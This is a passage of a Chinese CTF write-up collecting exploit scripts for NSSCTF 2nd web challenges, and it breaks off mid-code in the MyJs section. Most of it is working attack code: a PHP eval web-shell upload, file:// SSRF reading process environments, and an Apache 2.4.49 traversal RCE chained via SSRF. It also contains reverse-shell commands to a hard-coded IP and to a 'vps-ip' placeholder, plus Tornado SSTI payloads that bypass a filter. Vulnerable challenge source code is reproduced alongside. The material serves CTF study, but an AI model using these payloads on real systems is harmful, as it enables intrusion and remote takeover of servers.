<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests_toolbelt <span class="keyword">import</span> MultipartEncoder</span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28727/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_shell</span>():</span><br><span class="line">    shell = <span class="string">&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">    @eval($_GET[0]);</span></span><br><span class="line"><span class="string">    ?&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    files = &#123;</span><br><span class="line">        <span class="string">&quot;file&quot;</span>:(<span class="string">&quot;sh.php%2F%2E&quot;</span>,shell.encode(),<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    boundary = <span class="string">&#x27;--WebKitFormBoundary9K7xUkVGzyQA6e6h&#x27;</span></span><br><span class="line">    multipart_encoder = MultipartEncoder(fields=files,boundary=boundary)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:multipart_encoder.content_type</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.post(url=url,headers=headers,data=multipart_encoder)</span><br><span class="line">    <span class="built_in">print</span>(response.request.headers)</span><br><span class="line">    <span class="built_in">print</span>(response.request.body)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">command</span>):</span><br><span class="line">    payload = <span class="string">f&quot;sh.php?0=system(&#x27;<span class="subst">&#123;command&#125;</span>&#x27;);&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload).text</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line">upload_shell()</span><br><span class="line">execute_command(<span class="string">&quot;cd /;ls;env;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="NSSCTF-2nd-MyBox"><a href="#NSSCTF-2nd-MyBox" class="headerlink" title="[NSSCTF 2nd]MyBox"></a>[NSSCTF 2nd]MyBox</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/132559381" >https://blog.csdn.net/Jayjay___/article/details/132559381<i class="fas fa-external-link-alt"></i></a></p>
<p>一个优雅的exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;&quot;</span><br><span class="line"></span><br><span class="line">payload = &quot;?url=file:///proc/1/environ&quot;</span><br><span class="line">response = requests.get(url=url+payload).text</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure>

<h1 id="NSSCTF-2nd-MyBox2"><a href="#NSSCTF-2nd-MyBox2" class="headerlink" title="[NSSCTF 2nd]MyBox2"></a>[NSSCTF 2nd]MyBox2</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/132559381" >https://blog.csdn.net/Jayjay___/article/details/132559381<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Leaf_initial/article/details/132633048?spm=1001.2014.3001.5502" >https://blog.csdn.net/Leaf_initial/article/details/132633048?spm=1001.2014.3001.5502<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect</span><br><span class="line"><span class="keyword">import</span> requests, socket, struct</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">&#x27;url&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/?url=dosth&#x27;</span>)</span><br><span class="line">    url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> url.startswith(<span class="string">&#x27;file://&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">in</span> url <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;no!&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(url[<span class="number">7</span>:], <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">            <span class="keyword">if</span> url[<span class="number">7</span>:] == <span class="string">&#x27;/app/app.py&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;NSSCTF&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no!&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">elif</span> url.startswith(<span class="string">&#x27;http://localhost/&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> requests.get(url).text</span><br><span class="line">    <span class="keyword">elif</span> url.startswith(<span class="string">&#x27;mybox://127.0.0.1:&#x27;</span>):</span><br><span class="line">        port, content = url[<span class="number">18</span>:].split(<span class="string">&#x27;/_&#x27;</span>, maxsplit=<span class="number">1</span>)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">5</span>)</span><br><span class="line">        s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="built_in">int</span>(port)))</span><br><span class="line">        s.send(parse.unquote(content).encode())</span><br><span class="line">        res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            data = s.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                res += data</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">827</span>)</span><br></pre></td></tr></table></figure>



<p>一个优雅的exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28135/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_resource_code</span>():</span><br><span class="line">    payload = <span class="string">&quot;?url=file:///app/app.py&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload).text</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_localhost_code</span>():</span><br><span class="line">    payload = <span class="string">&quot;?url=http://localhost/&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload).text</span><br><span class="line">    <span class="built_in">print</span>(response)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gopher_request</span>():</span><br><span class="line">    </span><br><span class="line">    request_payload = \</span><br><span class="line">    <span class="string">&quot;&quot;&quot;GET /test.php HTTP/1.1</span></span><br><span class="line"><span class="string">    Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    request_payload = quote(quote(request_payload))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;?url=mybox://127.0.0.1:80/_&quot;</span>+request_payload</span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="built_in">print</span>(response.request.url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gopher_apache_2_4_49_exp</span>():</span><br><span class="line">    command = <span class="string">&#x27;&#x27;&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/39.105.51.11/7779 0&gt;&amp;1&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">    command = <span class="string">&quot;cd /;python3 -m http.server 8082&quot;</span></span><br><span class="line">    request_payload = \</span><br><span class="line"><span class="string">f&quot;&quot;&quot;POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:80</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(command)&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;command&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    request_payload = quote(quote(request_payload))</span><br><span class="line">    payload = <span class="string">&quot;?url=mybox://127.0.0.1:80/_&quot;</span> + request_payload</span><br><span class="line">    response = requests.get(url = url+payload)</span><br><span class="line">    <span class="built_in">print</span>(response.request.url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">    </span><br><span class="line">    request_payload = \</span><br><span class="line">    <span class="string">&quot;&quot;&quot;GET /nevvvvvver_f1nd_m3_the_t3ue_flag HTTP/1.1</span></span><br><span class="line"><span class="string">    Host: 127.0.0.1:8082</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    request_payload = quote(quote(request_payload))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;?url=mybox://127.0.0.1:8082/_&quot;</span>+request_payload</span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="built_in">print</span>(response.request.url)</span><br><span class="line">    <span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">gopher_apache_2_4_49_exp()</span><br><span class="line"><span class="comment"># readfile()</span></span><br></pre></td></tr></table></figure>

<h1 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">BASE_DIR = os.path.dirname(__file__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    bl = [<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> bl:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> chunk <span class="keyword">in</span> data.split():</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> chunk:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">31</span> &lt; <span class="built_in">ord</span>(c) &lt; <span class="number">128</span>):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IndexHandler</span>(tornado.web.RequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            self.finish(f.read())</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        data = self.get_argument(<span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(data):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(<span class="string">f&quot;&quot;&quot;&lt;html&gt;</span></span><br><span class="line"><span class="string">                        &lt;head&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span></span><br><span class="line"><span class="string">                        &quot;&quot;&quot;</span>)</span><br><span class="line">                f.flush()</span><br><span class="line">            self.render(<span class="string">&#x27;1.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.finish(<span class="string">&#x27;no no no&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = tornado.web.Application([</span><br><span class="line">            (<span class="string">r&quot;/&quot;</span>, IndexHandler),</span><br><span class="line">        ], compiled_template_cache=<span class="literal">False</span>)</span><br><span class="line">    app.listen(<span class="number">827</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br></pre></td></tr></table></figure>

<p><img src="/../images/34%E4%B8%80%E4%BA%9B%E8%87%AA%E8%AE%A4%E4%B8%BA%E4%BC%98%E9%9B%85%E7%9A%84exp.py/image-20230923115940042.png" alt="image-20230923115940042"></p>
<p>如果没有过滤，我们的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;eval(&#x27;__import__(&quot;os&quot;).popen(&quot;bash -i &gt;&amp; /dev/tcp/vps-ip/port 0&gt;&amp;1&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>有过滤的情况下我们可以使用笔记末尾武器库中的payload（适当进行替换）</p>
<p>boogipop师傅的payload：（&amp;换成%26）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:ssti=&#123;% set _tt_utf8 =eval %&#125;&#123;% raw request.body_arguments[request.method][0] %&#125;&amp;POST=__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/vps-ip/port &lt;%261&#x27;&quot;)</span><br></pre></td></tr></table></figure>

<p>这种方法利用了tornado里的变量覆盖，让__tt_utf8为eval，在渲染时时会有__tt_utf8(__tt_tmp)这样的调用，然后让__tt_tmp为恶意字符串就好了。</p>
<p>其实方法二都是这个原理。但是一开始对这个payload中的request.body_arguments[request.method][0]比较疑惑。咱们分开来看，首先是第一部分request.body_arguments表示POST参数，第二部分request.method是当前请求的方法也就是POST，第三部分[0]暂时还没找到解释。那request.body_arguments[request.method][0]的意思就是POST请求中名字为POST的参数，[request.method]实现了不用引号调用传入参数。</p>
<p>tornado解析post数据的问题 - myworldworld - 博客园 (cnblogs.com)</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-/p/10255342.html" >https://www.cnblogs.com/hello-/p/10255342.html<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="NSSCTF-2nd-MyJs"><a href="#NSSCTF-2nd-MyJs" class="headerlink" title="[NSSCTF 2nd]MyJs"></a>[NSSCTF 2nd]MyJs</h1><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/132559381" >https://blog.csdn.net/Jayjay___/article/details/132559381<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://leekosss.github.io/2023/08/28/%5BNSSCTF%202nd%5D/#WEB" >https://leekosss.github.io/2023/08/28/%5BNSSCTF%202nd%5D/#WEB<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.secpulse.com/archives/129304.html" >https://www.secpulse.com/archives/129304.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12754#toc-6" >https://xz.aliyun.com/t/12754#toc-6<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/superhin/p/16288059.html" >https://www.cnblogs.com/superhin/p/16288059.html<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;express-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">&#x27;randomatic&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">global</span>.<span class="property">secrets</span> = [];</span><br><span class="line"></span><br><span class="line"><span class="title function_">express</span>()</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;))</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;static&#x27;</span>))</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>)</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>)</span><br><span class="line">.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">randomize</span>(<span class="string">&#x27;a&#x27;</span>, <span class="number">16</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span></span><br><span class="line">&#125;))</span><br><span class="line">.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">data</span>) &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/javascript;charset=utf-8&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(__filename));</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">all</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;GET&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="literal">null</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password, token&#125; = req.<span class="property">body</span>;</span><br><span class="line">        <span class="keyword">const</span> sid = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(token.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()).<span class="property">secretid</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&#x27;login error.&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> secret = <span class="variable language_">global</span>.<span class="property">secrets</span>[sid];</span><br><span class="line">        <span class="keyword">const</span> user = jwt.<span class="title function_">verify</span>(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&quot;HS256&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">if</span> (username === user.<span class="property">username</span> &amp;&amp; password === user.<span class="property">password</span>) &#123;</span><br><span class="line">            req.<span class="property">session</span>.<span class="property">data</span> = &#123;</span><br><span class="line">                <span class="attr">username</span>: username,</span><br><span class="line">                <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="title function_">redirect</span>(<span class="string">&#x27;/home&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;login.ejs&#x27;</span>, &#123;<span class="attr">msg</span>: <span class="string">&#x27;login error.&#x27;</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">all</span>(<span 